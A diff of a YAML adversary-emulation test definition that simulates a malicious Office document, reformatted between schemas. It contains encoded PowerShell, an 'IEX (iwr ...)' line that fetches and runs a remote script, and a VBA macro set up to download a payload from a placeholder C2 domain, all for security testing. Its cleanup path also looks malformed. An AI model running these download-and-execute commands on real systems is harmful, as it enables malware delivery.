@@ -1,4 +1,4 @@
-- id: cba50eea-d920-569b-aaf8-09d71bdbeb5a
+- requirements: []
   name: Soumaia ART Tests - Office Generic Payload Download
   description: 'This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.
 
@@ -10,28 +10,16 @@
 
     Example input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt'
   tactic: execution
-  technique:
-    attack_id: T1204.002
-    name: 'User Execution: Malicious File'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKAAjAHsAYwAyAF8AZABvAG0AYQBpAG4AfQApACAAKABlAHgAaQB0ACAAMAApACAAZQBsAHMAZQAgACgAZQB4AGkAdAAgADEAKQAKAA==
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIARABlAHMAdABpAG4AYQB0AGkAbwBuACAAYwAyACAAcwBlAHIAdgBlAHIAIABkAG8AbQBhAGkAbgAgAG4AYQBtAGUAIABvAHIAIABJAFAAIABhAGQAZAByAGUAcwBzACAAbQB1AHMAdAAgAGIAZQAgAHMAZQB0ACAAYQBuAGQAIAByAGUAYQBjAGgAYQBiAGwAZQAgAGYAbwByACAASABUAFQAUAAgAHMAZQByAHYAaQBjAGUAIgAKAA==
-          }
-          powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBXAG8AcgBkAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACQAcAByAG8AYwBlAHMAcwAgAD0AIAAiAFcAbwByAGQAIgA7ACAAaQBmACAAKAAgACQAcAByAG8AYwBlAHMAcwAgAC0AZQBxACAAIgBXAG8AcgBkACIAKQAgAHsAJABwAHIAbwBjAGUAcwBzACAAPQAgACIAdwBpAG4AdwBvAHIAZAAiAH0ACgAgACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAkAHAAcgBvAGMAZQBzAHMACgAgACAAZQB4AGkAdAAgADAACgB9ACAAYwBhAHQAYwBoACAAewAgAGUAeABpAHQAIAAxACAAfQAKAA==
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA
-          }
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
-          $macroCode = Get-Content ".\test9-GenericPayloadDownload.txt" -Raw
-          $URL = "#{c2_domain}" + "/" + ""
-          $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt"
-          Invoke-MalDoc -macroCode $macroCode -officeProduct "Word"
-        cleanup: |-
-          Remove-Item "C:\Users\$env:username\Desktop\https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt" -ErrorAction Ignore
-        payloads:
-        - test9-GenericPayloadDownload.txt
+  technique_id: T1204.002
+  technique_name: 'User Execution: Malicious File'
+  executors:
+  - cleanup:
+    - Remove-Item "C:\Users\$env:username\Desktop\https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt" -ErrorAction Ignore
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - test9-GenericPayloadDownload.txt
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKAAjAHsAYwAyAF8AZABvAG0AYQBpAG4AfQApACAAKABlAHgAaQB0ACAAMAApACAAZQBsAHMAZQAgACgAZQB4AGkAdAAgADEAKQAKAA==; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIARABlAHMAdABpAG4AYQB0AGkAbwBuACAAYwAyACAAcwBlAHIAdgBlAHIAIABkAG8AbQBhAGkAbgAgAG4AYQBtAGUAIABvAHIAIABJAFAAIABhAGQAZAByAGUAcwBzACAAbQB1AHMAdAAgAGIAZQAgAHMAZQB0ACAAYQBuAGQAIAByAGUAYQBjAGgAYQBiAGwAZQAgAGYAbwByACAASABUAFQAUAAgAHMAZQByAHYAaQBjAGUAIgAKAA== }; powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBXAG8AcgBkAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACQAcAByAG8AYwBlAHMAcwAgAD0AIAAiAFcAbwByAGQAIgA7ACAAaQBmACAAKAAgACQAcAByAG8AYwBlAHMAcwAgAC0AZQBxACAAIgBXAG8AcgBkACIAKQAgAHsAJABwAHIAbwBjAGUAcwBzACAAPQAgACIAdwBpAG4AdwBvAHIAZAAiAH0ACgAgACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAkAHAAcgBvAGMAZQBzAHMACgAgACAAZQB4AGkAdAAgADAACgB9ACAAYwBhAHQAYwBoACAAewAgAGUAeABpAHQAIAAxACAAfQAKAA==; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA }; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing); $macroCode = Get-Content ".\test9-GenericPayloadDownload.txt" -Raw; $URL = "#{c2_domain}" + "/" + ""; $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt"; Invoke-MalDoc -macroCode $macroCode -officeProduct "Word"
+  id: cba50eea-d920-569b-aaf8-09d71bdbeb5a
